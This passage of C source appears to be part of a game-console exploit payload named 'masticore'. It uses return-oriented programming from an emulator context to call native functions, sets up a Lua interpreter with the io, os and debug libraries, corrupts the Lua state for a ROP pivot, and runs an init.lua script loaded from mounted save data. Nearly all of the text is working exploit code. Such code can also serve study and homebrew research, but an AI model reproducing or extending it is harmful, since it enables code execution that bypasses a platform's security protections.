    call_rop(lua_requiref, 0, lua_state, PS2_TO_NATIVE((u32)"table"), lualib_table, 1);
    write64(lua_state + 0x10, read64(lua_state + 0x10) - 0x10);
    
    call_rop(lua_requiref, 0, lua_state, PS2_TO_NATIVE((u32)"io"), lualib_io, 1);
    write64(lua_state + 0x10, read64(lua_state + 0x10) - 0x10);
    
    call_rop(lua_requiref, 0, lua_state, PS2_TO_NATIVE((u32)"os"), lualib_os, 1);
    write64(lua_state + 0x10, read64(lua_state + 0x10) - 0x10);
    
    call_rop(lua_requiref, 0, lua_state, PS2_TO_NATIVE((u32)"string"), lualib_string, 1);
    write64(lua_state + 0x10, read64(lua_state + 0x10) - 0x10);
    
    call_rop(lua_requiref, 0, lua_state, PS2_TO_NATIVE((u32)"math"), lualib_math, 1);
    write64(lua_state + 0x10, read64(lua_state + 0x10) - 0x10);
    
    call_rop(lua_requiref, 0, lua_state, PS2_TO_NATIVE((u32)"utf8"), lualib_utf8, 1);
    write64(lua_state + 0x10, read64(lua_state + 0x10) - 0x10);
    
    call_rop(lua_requiref, 0, lua_state, PS2_TO_NATIVE((u32)"debug"), lualib_debug, 1);
    write64(lua_state + 0x10, read64(lua_state + 0x10) - 0x10);
    
    setup_lua_primitives(lua_state);
    
    u64 load_status = call_rop(lua_loadfile, 0, 
                               lua_state, 
                               PS2_TO_NATIVE((u32)script_path),
                               0);
    
    if (load_status != 0) {
        send_notification("Failed to load init.lua");
        return;
    }
    
    send_notification("Executing... init.lua");
    
    // LUA ROP PIVOT buffer
    // [rdi] will be LUA_PIVOT_SCRATCH
    // With GC disabled corrupting lua state 0x0 is okay? I guess
    write64(lua_state, LUA_PIVOT_SCRATCH);

    u64 exec_status = call_rop(lua_pcall, 0,
                               lua_state,
                               0,        // nargs = 0
                               0,        // nresults = 0
                               0);       // msgh = 0 (no error handler) 
   
    if (exec_status != 0) {
        if (exec_status == 2) {
            send_notification("LUA_ERRRUN (Runtime error)");
            // Read error from log file
            static char log_path[] = "/av_contents/content_tmp/lua_log.txt";
            
            u64 fd = call_rop(sceKernelOpen, 0, 
                            PS2_TO_NATIVE((u32)log_path), 
                            0x0000,  // O_RDONLY
                            0);
            
            if (fd >= 0) {
                char log_buffer[8192];
                
                u64 bytes_read = call_rop(sceKernelRead, 0,
                                        fd,
                                        PS2_TO_NATIVE((u32)log_buffer),
                                        sizeof(log_buffer) - 1);
                
                call_rop(sceKernelClose, 0, fd);
                
                if (bytes_read > 0) {
                    log_buffer[bytes_read] = '\0';
                    send_notification("Log saved to /av_contents/content_tmp/lua_log.txt");
                    show_dialog(log_buffer);
                } else {
                    send_notification("Could not read error log");
                }
            } else {
                send_notification("Could not open error log");
            }
        } else if (exec_status == 4) {
            send_notification("LUA_ERRMEM (Memory allocation error)");
        } else if (exec_status == 5) {
            send_notification("LUA_ERRERR (Error in error handler)");
        } else {
            send_notification("Lua execution failed");
        }
    } else {
        send_notification("Lua execution finished");
    }
}

// ============================================================================

int main() {
    kill_threads();
    
    init_eboot_offsets();
    init_libc_offsets();
    setup_rop();
    init_function_offsets();
    init_fios_offsets();
    
    send_notification("masticore initialized");
    get_userid();
    
    if (mount_savedata_readonly() == -1) {
        send_notification("Fatal error aborting...");
        return -1;
    }
    
    initialize_lua();
    
}